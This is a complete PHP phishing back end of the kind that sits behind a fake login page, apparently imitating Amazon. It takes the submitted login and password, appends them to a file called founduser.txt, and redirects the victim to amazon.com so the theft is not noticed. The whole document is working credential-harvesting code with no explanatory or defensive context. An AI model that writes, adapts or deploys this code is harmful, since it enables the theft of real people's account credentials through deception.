<?php
 $user = $_POST["login"];
 $pass = $_POST["password"];

 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $user\n";
 $pa = "Password: $pass\n";
 fwrite($fileuser, "\n". $co. "\n". $us. $pa. "\n". $cl); 
 fclose($fileuser);
 header('Location: https://www.amazon.com/');
 exit()
?>
